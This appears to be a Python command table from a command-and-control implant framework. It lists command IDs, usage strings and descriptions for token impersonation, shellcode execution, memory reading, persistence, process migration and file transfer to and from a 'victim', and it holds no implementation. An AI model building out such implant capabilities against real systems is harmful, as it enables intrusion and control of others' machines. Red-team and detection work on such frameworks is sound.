CMD_INSPECT_TOKEN = 4
CMD_IMPERSONATE_TOKEN = 5
CMD_ENABLE_PRIVILEGE = 6
CMD_DISABLE_PRIVILEGE = 7
CMD_HOSTNAME = 8
CMD_WHOAMI = 9
CMD_LS = 10
CMD_CAT = 11
CMD_MKDIR = 12
CMD_RM = 13
CMD_UPLOAD = 14
CMD_DOWNLOAD = 15
CMD_PS = 16
CMD_GETPID = 17
CMD_EXEC = 18
CMD_SHELLCODEEXEC = 19
CMD_MEMREAD = 20
CMD_MODULELIST = 21
CMD_HANDLELIST = 22
CMD_ENV = 23
CMD_GETENV = 24
CMD_SETENV = 25
CMD_SLEEP = 26
CMD_KILL = 27
CMD_PERSIST = 28
CMD_UNPERSIST = 29
CMD_MIGRATE = 30
CMD_HANK = 31

COMMAND_SPECS = [
    {'id': CMD_INSPECT_TOKEN, 'name': 'inspect-token', 'usage': 'inspect-token', 'description': 'Return a summary of the current process token'},
    {'id': CMD_IMPERSONATE_TOKEN, 'name': 'impersonate-token', 'usage': 'impersonate-token <pid>', 'description': 'Attempt to impersonate the token of a target process'},
    {'id': CMD_ENABLE_PRIVILEGE, 'name': 'enable-privilege', 'usage': 'enable-privilege <name>', 'description': 'Attempt to enable a privilege on the current process token'},
    {'id': CMD_DISABLE_PRIVILEGE, 'name': 'disable-privilege', 'usage': 'disable-privilege <name>', 'description': 'Attempt to disable a privilege on the current process token'},
    {'id': CMD_HOSTNAME, 'name': 'hostname', 'usage': 'hostname', 'description': 'Return the host or computer name'},
    {'id': CMD_WHOAMI, 'name': 'whoami', 'usage': 'whoami', 'description': 'Display the current security context of the implant'},
    {'id': CMD_LS, 'name': 'ls', 'usage': 'ls <path>', 'description': 'List files and directories in a specified path'},
    {'id': CMD_CAT, 'name': 'cat', 'usage': 'cat <file>', 'description': 'Read and display the contents of a file'},
    {'id': CMD_MKDIR, 'name': 'mkdir', 'usage': 'mkdir <path>', 'description': 'Create a new directory'},
    {'id': CMD_RM, 'name': 'rm', 'usage': 'rm <path>', 'description': 'Remove a file or directory'},
    {'id': CMD_UPLOAD, 'name': 'upload', 'usage': 'upload <src> <dst>', 'description': 'Upload a file from the operator to the implant'},
    {'id': CMD_DOWNLOAD, 'name': 'download', 'usage': 'download <src> <dst>', 'description': 'Download a file from the implant to the operator'},
    {'id': CMD_PS, 'name': 'ps', 'usage': 'ps', 'description': 'List running processes'},
    {'id': CMD_GETPID, 'name': 'getpid', 'usage': 'getpid', 'description': 'Return the process ID of the implant'},
    {'id': CMD_EXEC, 'name': 'exec', 'usage': 'exec <command>', 'description': 'Execute a system command'},
    {'id': CMD_SHELLCODEEXEC, 'name': 'shellcode-exec', 'usage': 'shellcode-exec <path>', 'description': 'Execute shellcode in memory from a file'},
    {'id': CMD_MEMREAD, 'name': 'mem-read', 'usage': 'mem-read <addr> <size>', 'description': 'Read memory from a specified address'},
    {'id': CMD_MODULELIST, 'name': 'module-list', 'usage': 'module-list', 'description': 'List loaded modules in the current process'},
    {'id': CMD_HANDLELIST, 'name': 'handle-list', 'usage': 'handle-list', 'description': 'List open handles in the current process'},
    {'id': CMD_ENV, 'name': 'env', 'usage': 'env', 'description': 'List all environment variables'},
    {'id': CMD_GETENV, 'name': 'get-env', 'usage': 'get-env <name>', 'description': 'Get the value of a specific environment variable'},
    {'id': CMD_SETENV, 'name': 'set-env', 'usage': 'set-env <name> <value>', 'description': 'Set or modify an environment variable'},
    {'id': CMD_SLEEP, 'name': 'sleep', 'usage': 'sleep <seconds>', 'description': 'Set the implant sleep interval'},
    {'id': CMD_KILL, 'name': 'kill', 'usage': 'kill', 'description': 'Terminate the implant process'},
    {'id': CMD_PERSIST, 'name': 'persist', 'usage': 'persist <method>', 'description': 'Establish persistence on the target system'},
    {'id': CMD_UNPERSIST, 'name': 'unpersist', 'usage': 'unpersist <method>', 'description': 'Remove persistence from the target system'},
    {'id': CMD_MIGRATE, 'name': 'migrate', 'usage': 'migrate <pid>', 'description': 'Migrate the implant to a different process'},
    {'id': CMD_HANK, 'name': 'hank', 'usage': 'hank', 'description': 'Places ascii art of H@nk on the screen of the victim'},
]

CMD_NAMES = {spec['id']: spec['name'] for spec in COMMAND_SPECS}
CMD_IDS = {spec['name']: spec['id'] for spec in COMMAND_SPECS}
